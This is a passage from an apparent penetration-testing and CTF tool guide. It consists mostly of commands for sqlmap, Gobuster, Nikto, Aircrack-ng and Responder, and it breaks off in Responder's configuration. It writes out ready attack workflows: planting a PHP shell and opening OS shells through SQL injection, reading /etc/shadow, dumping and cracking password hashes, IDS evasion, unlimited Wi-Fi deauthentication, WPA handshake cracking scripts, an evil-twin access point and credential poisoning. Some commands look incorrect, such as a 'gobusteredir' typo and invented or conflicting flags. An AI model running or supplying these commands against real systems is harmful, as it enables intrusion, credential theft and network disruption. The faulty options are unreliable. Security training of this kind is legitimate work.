sqlmap -u "http://192.168.1.10/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Execute OS commands (UDF)
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell
```

**MSSQL:**

```bash
# Execute OS commands (xp_cmdshell)
sqlmap -u "http://192.168.1.10/page?id=1" --os-cmd="whoami"

# SMB relay attack
sqlmap -u "http://192.168.1.10/page?id=1" --os-smbrelay

# Registry access
sqlmap -u "http://192.168.1.10/page?id=1" --reg-read --reg-key="HKLM\Software\Microsoft"
```

**PostgreSQL:**

```bash
# Read files
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd"

# OS shell (requires admin)
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell

# Large object support
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/shadow"
```

**Oracle:**

```bash
# Enumerate tablespaces
sqlmap -u "http://192.168.1.10/page?id=1" --schema

# Execute OS commands (Java stored procedures)
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell
```

**SQLite:**

```bash
# Enumerate database structure
sqlmap -u "http://192.168.1.10/page?id=1" --tables

# Dump data
sqlmap -u "http://192.168.1.10/page?id=1" -D main -T users --dump
```

### Hash Cracking Integration

**Dump and crack passwords:**

```bash
# Dump password hashes
sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users -C "username,password" --dump

# SQLmap can attempt to crack hashes automatically
# When prompted: "Do you want to crack them via a dictionary-based attack? [Y/n/q]"
# Provide wordlist path or use default

# Manual cracking after dump:
# Hashes saved in: ~/.local/share/sqlmap/output/target.com/dump/
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt rockyou.txt  # For MD5
```

**Specify dictionary:**

```bash
sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T users --dump --common-columns --passwords
# When prompted for dictionary: /usr/share/wordlists/rockyou.txt
```

### API Testing

**JSON API:**

```bash
# JSON POST request
sqlmap -u "http://192.168.1.10/api/user" \
  --method=POST \
  --data='{"id":"1*","action":"view"}' \
  --headers="Content-Type: application/json" \
  --level=3 \
  --batch

# JSON with nested parameters
sqlmap -u "http://192.168.1.10/api/search" \
  --data='{"query":{"user_id":"1*","type":"all"}}' \
  --headers="Content-Type: application/json" \
  --batch
```

**REST API:**

```bash
# GET with path parameter
sqlmap -u "http://192.168.1.10/api/users/1*" --batch

# PUT request
sqlmap -u "http://192.168.1.10/api/users/1" \
  --method=PUT \
  --data='{"name":"test*"}' \
  --headers="Content-Type: application/json" \
  --batch
```

**GraphQL:**

```bash
# GraphQL query injection
sqlmap -u "http://192.168.1.10/graphql" \
  --data='{"query":"{ user(id: \"1*\") { name email } }"}' \
  --headers="Content-Type: application/json" \
  --batch
```

### Reporting and Output

**Verbose output:**

```bash
# Level 1-6 verbosity
sqlmap -u "http://192.168.1.10/page?id=1" -v 3

# Traffic log
sqlmap -u "http://192.168.1.10/page?id=1" -t /tmp/traffic.txt

# Parse log file
sqlmap -l /tmp/burp_log.xml  # Burp Suite log
```

**CSV output:**

```bash
# Dump to CSV format
sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users --dump --dump-format=CSV
```

**Parse results:**

```bash
# Results stored in:
ls -la ~/.local/share/sqlmap/output/192.168.1.10/

# View dumped data
cat ~/.local/share/sqlmap/output/192.168.1.10/dump/database_name/table_name.csv
```

### Troubleshooting

**Common issues and solutions:**

```bash
# Connection timeout
sqlmap -u "http://192.168.1.10/page?id=1" --timeout=60 --retries=5

# WAF detection
sqlmap -u "http://192.168.1.10/page?id=1" --identify-waf
# Then apply appropriate tamper scripts

# False negatives (missed injection)
# Increase level and risk
sqlmap -u "http://192.168.1.10/page?id=1" --level=5 --risk=3

# No output (blind injection)
# Verify with specific technique
sqlmap -u "http://192.168.1.10/page?id=1" --technique=T --time-sec=5 -v 3

# String/regex issues
# Manually specify true/false conditions
sqlmap -u "http://192.168.1.10/page?id=1" --string="Welcome" --not-string="Error"

# Cookie/session issues
# Provide valid session cookie
sqlmap -u "http://192.168.1.10/page?id=1" --cookie="PHPSESSID=valid_session_here"

# CSRF token
# Use --csrf-token option with token parameter name
sqlmap -u "http://192.168.1.10/form" --data="field=value&csrf=token" --csrf-token=csrf
```

**Debug mode:**

```bash
# Detailed debug output
sqlmap -u "http://192.168.1.10/page?id=1" --debug

# Check payloads being used
sqlmap -u "http://192.168.1.10/page?id=1" -v 4
```

### Update and Configuration

**Update SQLmap:**

```bash
# Update from Git repository
sqlmap --update

# Check version
sqlmap --version
```

**Configuration file:**

```bash
# Default config
cat /usr/share/sqlmap/sqlmap.conf

# Custom configuration
cp /usr/share/sqlmap/sqlmap.conf ~/.sqlmap.conf
# Edit ~/.sqlmap.conf with preferred defaults
```

### Advanced Examples

**Multi-stage exploitation:**

```bash
# Stage 1: Detection and fingerprint
sqlmap -u "http://192.168.1.10/page?id=1" --batch --fingerprint

# Stage 2: Extract database structure
sqlmap -u "http://192.168.1.10/page?id=1" --schema --batch

# Stage 3: Search for sensitive data
sqlmap -u "http://192.168.1.10/page?id=1" --search -C password,pass,pwd,hash --batch

# Stage 4: Dump found tables
sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T admin_users --dump --batch

# Stage 5: Attempt privilege escalation
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell --batch
```

**Complete database compromise:**

```bash
# Enumerate everything
sqlmap -u "http://192.168.1.10/page?id=1" \
  --banner \
  --current-user \
  --current-db \
  --is-dba \
  --users \
  --passwords \
  --privileges \
  --dbs \
  --batch

# Dump all non-system databases
sqlmap -u "http://192.168.1.10/page?id=1" --dump-all --exclude-sysdbs --batch

# Attempt OS access
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd" --batch
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell --batch
```

---

**Related Critical Topics**

For comprehensive exploitation tool mastery, also investigate:

- **Burp Suite Professional** - Intercepting proxy with active scanner, intruder module for advanced fuzzing, and extension ecosystem
- **Metasploit Framework** - Exploitation framework with auxiliary modules for scanning, post-exploitation pivoting, and payload generation
- **Custom Script Development** - Python scripting with requests, Scapy for packet crafting, and automation of repetitive exploitation tasks
- **Password Analytics** - Statistical analysis of cracked passwords to generate targeted wordlists and identify organizational password patterns
- **Web Application Firewalls (WAF)** - Understanding ModSecurity, AWS WAF, Cloudflare rules to develop effective bypass techniques

---

## Gobuster/Dirbuster

Gobuster is a high-performance directory and DNS brute-forcing tool written in Go. It's faster than Dirbuster and integrates well into automated workflows.

### Gobuster Modes

**Available modes:**

- `dir` - Directory/file enumeration
- `dns` - DNS subdomain enumeration
- `vhost` - Virtual host enumeration
- `s3` - Amazon S3 bucket enumeration
- `gcs` - Google Cloud Storage enumeration
- `tftp` - TFTP enumeration

### Directory/File Enumeration (dir mode)

**Basic directory brute-force:**

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak

# Multiple extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,zip,bak
```

**Common wordlist locations on Kali:**

```bash
# Small lists (fast)
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt

# Medium lists
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Large lists (comprehensive)
/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# Technology-specific
/usr/share/seclists/Discovery/Web-Content/apache.txt
/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
/usr/share/seclists/Discovery/Web-Content/nginx.txt
```

**Advanced options:**

```bash
# Custom status codes to include
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307,401,403"

# Exclude specific status codes
gobuster dir -u http://target.com -w wordlist.txt -b "404,400"

# Follow redirects
gobuster dir -u http://target.com -w wordlist.txt -r

# Show length of response
gobuster dir -u http://target.com -w wordlist.txt -l

# Custom User-Agent
gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Add custom headers
gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token123"

# Proxy through Burp Suite
gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080

# Increase threads (default 10)
gobuster dir -u http://target.com -w wordlist.txt -t 50

# Timeout (default 10s)
gobuster dir -u http://target.com -w wordlist.txt --timeout 15s

# Wildcard filtering
gobusteredir -u http://target.com -w wordlist.txt --wildcard
```

**HTTPS and certificate options:**

```bash
# Skip SSL certificate verification
gobuster dir -u https://target.com -w wordlist.txt -k

# Specify client certificate
gobuster dir -u https://target.com -w wordlist.txt --client-cert cert.pem --client-cert-key key.pem
```

**Authentication:**

```bash
# Basic authentication
gobuster dir -u http://target.com -w wordlist.txt -U username -P password

# Cookie-based authentication
gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=abc123def456"
```

**Output options:**

```bash
# Save output to file
gobuster dir -u http://target.com -w wordlist.txt -o results.txt

# Quiet mode (only show found)
gobuster dir -u http://target.com -w wordlist.txt -q

# No status (faster, no live display)
gobuster dir -u http://target.com -w wordlist.txt --no-status

# Expanded output (show full URLs)
gobuster dir -u http://target.com -w wordlist.txt -e
```

**Recursive enumeration:**

```bash
# Recursively scan discovered directories
gobuster dir -u http://target.com -w wordlist.txt -r --depth 3

# Note: Gobuster doesn't have native recursive mode like dirb
# Alternative: use discovered paths as new starting points
```

**Pattern matching:**

```bash
# Exclude patterns
gobuster dir -u http://target.com -w wordlist.txt --exclude-length 1234

# Include specific patterns (custom wordlist required)
gobuster dir -u http://target.com -w wordlist.txt -p pattern.txt
```

### DNS Subdomain Enumeration (dns mode)

**Basic subdomain brute-force:**

```bash
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Show CNAMEs
gobuster dns -d target.com -w dns-wordlist.txt -c

# Show IP addresses
gobuster dns -d target.com -w dns-wordlist.txt -i
```

**DNS wordlists on Kali:**

```bash
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
```

**Custom DNS resolver:**

```bash
# Specify DNS server
gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8

# Multiple resolvers
gobuster dns -d target.com -w wordlist.txt -r 8.8.8.8,1.1.1.1
```

**Advanced DNS options:**

```bash
# Timeout per query
gobuster dns -d target.com -w wordlist.txt --timeout 3s

# Wildcard filtering
gobuster dns -d target.com -w wordlist.txt --wildcard

# Output results
gobuster dns -d target.com -w wordlist.txt -o subdomains.txt

# Thread count
gobuster dns -d target.com -w wordlist.txt -t 50
```

### Virtual Host Enumeration (vhost mode)

**Discover virtual hosts:**

```bash
# Basic vhost enumeration
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Append domain to wordlist entries
gobuster vhost -u http://target.com -w wordlist.txt --append-domain

# Custom headers
gobuster vhost -u http://target.com -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1"
```

**Filter by response characteristics:**

```bash
# Exclude specific status codes
gobuster vhost -u http://target.com -w wordlist.txt -b "404"

# Filter by response length
gobuster vhost -u http://target.com -w wordlist.txt --exclude-length 1234
```

### S3 Bucket Enumeration (s3 mode)

**Amazon S3 bucket discovery:**

```bash
# Basic S3 enumeration
gobuster s3 -w wordlist.txt

# Custom endpoint
gobuster s3 -w wordlist.txt -e

# Proxy through Burp
gobuster s3 -w wordlist.txt -p http://127.0.0.1:8080
```

### Practical CTF Scenarios

**Comprehensive web enumeration:**

```bash
#!/bin/bash
TARGET="http://target.com"
WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

# Initial scan with common extensions
gobuster dir -u $TARGET -w $WORDLIST -x php,html,txt,bak -o initial_scan.txt

# Extract discovered directories
grep -oP '(?<=\/)[^\/\s]+(?=\s+\(Status: 200)' initial_scan.txt > discovered_dirs.txt

# Scan discovered directories
while read dir; do
    gobuster dir -u "$TARGET/$dir" -w /usr/share/wordlists/dirb/common.txt -x php,txt -o "${dir}_scan.txt"
done < discovered_dirs.txt
```

**API endpoint discovery:**

```bash
# Common API paths
gobuster dir -u http://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -x json

# RESTful API enumeration
gobuster dir -u http://target.com/api/v1 -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
```

**Backup file hunting:**

```bash
# Common backup extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x bak,old,backup,BAK,~,zip,tar.gz,sql

# Configuration files
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt -x conf,config,cfg,ini,yaml,yml
```

### Dirbuster (GUI Alternative)

**Installation and launch:**

```bash
# Pre-installed on Kali
dirbuster

# Or command line
java -jar /usr/share/dirbuster/DirBuster-1.0-RC1.jar
```

**Dirbuster advantages [Inference - based on tool characteristics]:**

- GUI interface for visual analysis
- Real-time progress monitoring
- Built-in wordlist management
- Response analysis with regex filtering
- Session saving and restoration

**Dirbuster configuration:**

1. Target URL: `http://target.com`
2. Number of threads: 10-50
3. Wordlist: Select from list or browse
4. File extensions: `php,html,txt,bak`
5. Select HTTP method: GET/HEAD/POST
6. Start scan

## Nikto

Nikto is a comprehensive web server scanner that performs extensive tests for dangerous files, outdated software, server misconfigurations, and known vulnerabilities.

### Basic Nikto Usage

**Simple scan:**

```bash
nikto -h http://target.com

# Scan HTTPS
nikto -h https://target.com

# Scan specific port
nikto -h http://target.com:8080

# Multiple hosts from file
nikto -h targets.txt
```

**Scan options:**

```bash
# Display only specific finding types
nikto -h http://target.com -Display 1

# Display codes:
# 1 - Show redirects
# 2 - Show cookies received
# 3 - Show all 200/OK responses
# 4 - Show URLs requiring authentication
# V - Verbose output
# E - Show all HTTP errors
# P - Show redirects and received cookies

# Combine display options
nikto -h http://target.com -Display 1234VP
```

### Tuning and Plugin Selection

**Tune scan tests:**

```bash
# Scan only specific test categories
nikto -h http://target.com -Tuning 123

# Tuning options:
# 0 - File Upload
# 1 - Interesting File / Seen in logs
# 2 - Misconfiguration / Default File
# 3 - Information Disclosure
# 4 - Injection (XSS/Script/HTML)
# 5 - Remote File Retrieval - Inside Web Root
# 6 - Denial of Service
# 7 - Remote File Retrieval - Server Wide
# 8 - Command Execution / Remote Shell
# 9 - SQL Injection
# a - Authentication Bypass
# b - Software Identification
# c - Remote Source Inclusion
# x - Reverse Tuning (exclude tests)

# Example: Only test for SQLi and XSS
nikto -h http://target.com -Tuning 49

# Exclude specific tests (reverse tuning)
nikto -h http://target.com -Tuning x6
```

**Plugin management:**

```bash
# List available plugins
nikto -list-plugins

# Run specific plugins only
nikto -h http://target.com -Plugins "apache_expect_xss,cookies"

# Common useful plugins:
nikto -h http://target.com -Plugins "shellshock,heartbleed,httpoptions"
```

### Output Options

**Save scan results:**

```bash
# Output to text file
nikto -h http://target.com -o results.txt

# HTML output
nikto -h http://target.com -o results.html -Format html

# XML output
nikto -h http://target.com -o results.xml -Format xml

# CSV output
nikto -h http://target.com -o results.csv -Format csv

# Multiple formats simultaneously
nikto -h http://target.com -o results -Format htm,txt,csv
```

### Authentication and Headers

**Basic authentication:**

```bash
nikto -h http://target.com -id username:password
```

**Custom headers:**

```bash
# Add custom header
nikto -h http://target.com -useragent "CustomUA/1.0"

# Multiple headers (using config file or -H option not directly supported)
# Alternative: Use -Option directive
nikto -h http://target.com -Option USERAGENT="Mozilla/5.0"
```

**Cookie authentication:**

```bash
# Not directly supported via CLI
# Workaround: Modify nikto.conf or use proxy
nikto -h http://target.com -config /path/to/custom_nikto.conf
```

### Proxy and Network Options

**Proxy configuration:**

```bash
# Use HTTP proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Proxy with authentication
nikto -h http://target.com -useproxy http://user:pass@proxy.com:8080
```

**SSL/TLS options:**

```bash
# Force SSL
nikto -h target.com -ssl

# Skip SSL certificate verification (for self-signed certs)
nikto -h https://target.com -nossl

# Note: -nossl is deprecated; nikto typically accepts self-signed certs by default
```

**Timeout and throttling:**

```bash
# Set timeout (seconds)
nikto -h http://target.com -timeout 10

# Evasion/throttling (IDS evasion)
nikto -h http://target.com -evasion 1

# Evasion techniques:
# 1 - Random URI encoding (non-UTF8)
# 2 - Directory self-reference (/./)
# 3 - Premature URL ending
# 4 - Prepend long random string
# 5 - Fake parameter
# 6 - TAB as request spacer
# 7 - Change the case of the URL
# 8 - Use Windows directory separator (\)

# Combine multiple evasion techniques
nikto -h http://target.com -evasion 1257

# Pause between tests (seconds)
nikto -h http://target.com -Pause 2
```

### Advanced Scanning Techniques

**Port scanning:**

```bash
# Scan multiple ports on single host
nikto -h http://target.com -port 80,443,8080,8443

# Scan port range
nikto -h http://target.com -port 80-90
```

**Virtual host scanning:**

```bash
# Specify virtual host
nikto -h http://192.168.1.100 -vhost target.com
```

**Save/resume sessions:**

```bash
# Save session to resume later (not natively supported)
# Workaround: Use output files and manual review

# Alternative: Use -Cgidirs for incremental testing
nikto -h http://target.com -Cgidirs all
```

### Nikto Database Updates

**Update vulnerability database:**

```bash
# Update plugins and databases
nikto -update

# Check current version
nikto -Version
```

### Practical CTF Scenarios

**Comprehensive vulnerability scan:**

```bash
#!/bin/bash
TARGET="http://target.com"
OUTPUT_DIR="nikto_results"

mkdir -p $OUTPUT_DIR

# Full scan with all tests
nikto -h $TARGET -o "$OUTPUT_DIR/full_scan.html" -Format html

# Quick scan for common issues
nikto -h $TARGET -Tuning 123 -o "$OUTPUT_DIR/quick_scan.txt"

# Focused security testing
nikto -h $TARGET -Tuning 489ab -o "$OUTPUT_DIR/security_scan.txt"

# Check for known vulns (shellshock, heartbleed)
nikto -h $TARGET -Plugins "shellshock,heartbleed" -o "$OUTPUT_DIR/known_vulns.txt"
```

**Multi-target scan:**

```bash
# Create target list
echo "http://target1.com" > targets.txt
echo "http://target2.com:8080" >> targets.txt
echo "https://target3.com" >> targets.txt

# Scan all targets
while read target; do
    hostname=$(echo $target | cut -d'/' -f3 | tr ':' '_')
    nikto -h $target -o "nikto_${hostname}.txt"
done < targets.txt
```

**Stealth scanning with evasion:**

```bash
# Slow, evaded scan
nikto -h http://target.com \
    -evasion 1257 \
    -Pause 3 \
    -timeout 15 \
    -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

### Nikto Configuration File

**Location:** `/etc/nikto/config.txt`

**Common modifications:**

```bash
# Edit config
sudo nano /etc/nikto/config.txt

# Useful settings:
# CLIOPTS=-Display 123
# USERAGENT=Mozilla/5.0...
# CHECKMETHODS=HEAD GET
```

### Limitations and Considerations

**Nikto characteristics [Inference - based on common tool behavior]:**

- Noisy scanner (generates significant traffic)
- Easily detected by IDS/IPS
- Produces many false positives
- Best used during authorized testing
- Complements other scanning tools

## Aircrack-ng Suite

Aircrack-ng is a comprehensive suite of tools for wireless network security assessment, including packet capture, WEP/WPA/WPA2-PSK cracking, and various wireless attacks.

### Suite Components

**Core tools:**

- `airmon-ng` - Enable monitor mode on wireless interfaces
- `airodump-ng` - Packet capture and network discovery
- `aireplay-ng` - Packet injection and deauthentication
- `aircrack-ng` - WEP/WPA-PSK key cracking
- `airdecap-ng` - Decrypt captured packets
- `airolib-ng` - Precomputed PMK storage
- `packetforge-ng` - Create encrypted packets for injection
- `airbase-ng` - Rogue AP creation
- `airdeclop-ng` - Remove WEP encryption from capture files
- `easside-ng` - Automated WEP cracking
- `wesside-ng` - Automated WEP cracking with PTW attack

### Monitor Mode Configuration

**Enable monitor mode:**

```bash
# Identify wireless interface
iwconfig
# or
airmon-ng

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# New interface created: wlan0mon (or mon0 on older systems)

# Verify monitor mode
iwconfig wlan0mon
```

**Change wireless channel:**

```bash
# Set specific channel
sudo iwconfig wlan0mon channel 6

# Monitor multiple channels (channel hopping)
# airodump-ng handles this automatically without --channel flag
```

**Disable monitor mode:**

```bash
sudo airmon-ng stop wlan0mon

# Restart NetworkManager if killed
sudo systemctl start NetworkManager
```

### Network Discovery (airodump-ng)

**Basic wireless network scan:**

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Output columns:
# BSSID - MAC address of AP
# PWR - Signal strength
# Beacons - Number of beacon frames
# #Data - Number of data packets
# #/s - Packets per second
# CH - Channel
# MB - Maximum speed
# ENC - Encryption (OPN, WEP, WPA, WPA2, WPA3)
# CIPHER - Cipher used
# AUTH - Authentication protocol
# ESSID - Network name
```

**Targeted capture:**

```bash
# Capture on specific channel
sudo airodump-ng -c 6 wlan0mon

# Target specific BSSID and save to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Output files created:
# capture-01.cap - Packet capture
# capture-01.csv - CSV data
# capture-01.kismet.csv - Kismet compatible
# capture-01.kismet.netxml - Kismet XML
```

**Advanced filtering:**

```bash
# Filter by ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon

# Show only WPA2 networks
sudo airodump-ng --encrypt WPA2 wlan0mon

# Show only clients (station mode)
sudo airodump-ng --showack wlan0mon

# Increase capture speed
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --write-interval 1 -w capture wlan0mon
```

### WPA/WPA2 Handshake Capture

**Capture 4-way handshake:**

```bash
# Start capture on target network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# In another terminal, deauthenticate client to force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message in airodump-ng

# Deauth specific client
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
```

**Verify handshake capture:**

```bash
# Check for handshake in capture file
sudo aircrack-ng wpa_capture-01.cap

# Should show "1 handshake" in output
```

### Deauthentication Attacks (aireplay-ng)

**Basic deauth attack:**

```bash
# Deauth all clients from AP
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth count (0 = unlimited)
# -a = AP MAC address

# Deauth specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# -c = Client MAC address
```

**Targeted deauthentication:**

```bash
# Continuous deauth (DOS)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Burst deauth (stealthy)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### WPA/WPA2-PSK Cracking (aircrack-ng)

**Dictionary attack:**

```bash
# Basic dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# -w = Wordlist path
# -b = Target BSSID (optional, speeds up cracking)

# Use multiple capture files
sudo aircrack-ng -w wordlist.txt wpa_capture*.cap

# Specify ESSID instead of BSSID
sudo aircrack-ng -w wordlist.txt -e "TargetNetwork" wpa_capture-01.cap
```

**Advanced cracking options:**

```bash
# Use multiple CPU cores (automatic)
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap

# Use specific number of CPUs
sudo aircrack-ng -w wordlist.txt -p 4 capture.cap

# Show cracking statistics
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF -S capture.cap
```

**Custom wordlist generation:**

```bash
# Using crunch for wordlist generation
crunch 8 12 -t @@@@%%%% -o custom_wordlist.txt
# 8-12 chars, @ = lowercase, % = numbers

# Using John the Ripper rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout > custom_wordlist.txt
```

### WEP Cracking

**WEP attack methodology:**

```bash
# 1. Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# 2. Fake authentication (if needed)
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# 3. ARP replay attack to generate IVs
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# 4. Wait for ~40,000-80,000 data packets (IVs)

# 5. Crack WEP key
sudo aircrack-ng wep_capture-01.cap
```

**PTW attack (faster WEP cracking):**

```bash
# Requires fewer IVs (~20,000)
sudo aircrack-ng -z wep_capture-01.cap
```

### PMK Precomputation (airolib-ng)

**Create and populate PMK database:**

```bash
# Create database
airolib-ng pmk_database --create

# Import ESSID
echo "TargetNetwork" > essid.txt
airolib-ng pmk_database --import essid essid.txt

# Import passwords
airolib-ng pmk_database --import passwd /usr/share/wordlists/rockyou.txt

# Compute PMKs
airolib-ng pmk_database --batch

# Verify database
airolib-ng pmk_database --stats
```

**Use PMK database for cracking:**

```bash
sudo aircrack-ng -r pmk_database capture.cap
```

### Rogue Access Point (airbase-ng)

**Create fake AP:**

```bash
# Basic rogue AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# WPA2-PSK protected AP
sudo airbase-ng -e "SecureAP" -c 6 -Z 4 wlan0mon
# -Z 4 = WPA2 CCMP

# Capture handshakes from connecting clients
sudo airbase-ng -e "FakeAP" -c 6 -W 1 wlan0mon
# -W 1 = WEP
```

**Evil twin attack:**

```bash
# Clone target AP
sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "TargetNetwork" -c 6 wlan0mon

# Deauth clients from real AP in separate terminal
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Packet Injection Testing

**Test injection capability:**

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# Test against specific AP
sudo aireplay-ng --test -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Decrypting Captured Traffic

**Decrypt WEP traffic:**

```bash
# After obtaining WEP key
sudo airdecap-ng -w 1234567890 wep_capture-01.cap

# Output: wep_capture-01-dec.cap
```

**Decrypt WPA traffic:**

```bash
# After obtaining WPA passphrase
sudo airdecap-ng -e "TargetNetwork" -p "passphrase123" wpa_capture-01.cap

# Output: wpa_capture-01-dec.cap
```

### Practical CTF Wireless Scenarios

**Complete WPA2 attack workflow:**

```bash
#!/bin/bash

INTERFACE="wlan0"
BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL="6"
ESSID="TargetNetwork"

# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE

# Start capture
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w handshake ${INTERFACE}mon &
AIRODUMP_PID=$!

# Wait for capture to initialize
sleep 5

# Deauthenticate clients
sudo aireplay-ng --deauth 10 -a $BSSID ${INTERFACE}mon

# Wait for handshake
echo "Waiting for handshake capture..."
sleep 30

# Kill airodump
sudo kill $AIRODUMP_PID

# Verify handshake
if sudo aircrack-ng handshake-01.cap | grep -q "1 handshake"; then
    echo "[+] Handshake captured successfully"
    
    # Crack with rockyou
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $BSSID handshake-01.cap
else
    echo "[-] No handshake captured, retry"
fi

# Disable monitor mode
sudo airmon-ng stop ${INTERFACE}mon
```

**Automated WEP cracking:**

```bash
# Using wesside-ng (fully automated)
sudo wesside-ng -i wlan0mon

# Or using easside-ng with server
sudo easside-ng -v wlan0mon
```

### Hashcat Integration

**Convert capture to hashcat format:**

```bash
# Extract handshake to hashcat format
sudo aircrack-ng capture.cap -J hashcat_handshake

# Output: hashcat_handshake.hccapx (for hashcat <6.0)

# For hashcat 6.0+, use hcxpcapngtool
hcxpcapngtool -o hashcat.22000 capture.cap

# Crack with hashcat
hashcat -m 22000 hashcat.22000 /usr/share/wordlists/rockyou.txt

# WPA/WPA2 mode: 2500 (old format), 22000 (new format)
```

### Troubleshooting

**Common issues and solutions:**

```bash
# Monitor mode not working
sudo airmon-ng check kill
sudo rfkill unblock all

# Injection not working - check with:
sudo aireplay-ng --test wlan0mon

# No handshake captured:
# - Increase deauth count
# - Try deauthing specific clients
# - Verify channel is correct
# - Check signal strength (PWR column)

# Card not supported:
lsusb  # Check if using external adapter
iwconfig  # Verify interface exists
```

## Responder

Responder is a LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers (HTTP/S, SMB, MSSQL, FTP, LDAP) for capturing credentials on Windows networks.

### Responder Overview

**Protocols poisoned:**

- LLMNR (Link-Local Multicast Name Resolution)
- NBT-NS (NetBIOS Name Service)
- MDNS (Multicast DNS)

**Built-in rogue servers:**

- HTTP/HTTPS
- SMB
- MSSQL
- FTP
- LDAP
- POP3/IMAP/SMTP
- DNS

### Basic Responder Usage

**Start Responder:**

```bash
# Basic execution on specific interface
sudo responder -I eth0

# Analyze mode (no poisoning, just listen)
sudo responder -I eth0 -A

# Verbose output
sudo responder -I eth0 -v

# Force WPAD authentication
sudo responder -I eth0 -w

# Force basic HTTP authentication
sudo responder -I eth0 -b
```

**Interface identification:**

```bash
# List network interfaces
ip addr show
ifconfig

# Common interfaces:
# eth0 - Ethernet
# wlan0 - Wireless
# tun0 - VPN tunnel
```

### Configuration File

**Location:** `/usr/share/responder/Responder.conf`

**Key configuration options:**

```bash
# Edit configuration
sudo nano /usr/share/responder/Responder.conf

# Important settings:
[Responder Core]
SQL = On              # MSSQL server
SMB = On              # SMB server
HTTP = On             # HTTP server
HTTPS = On            # HTTPS server
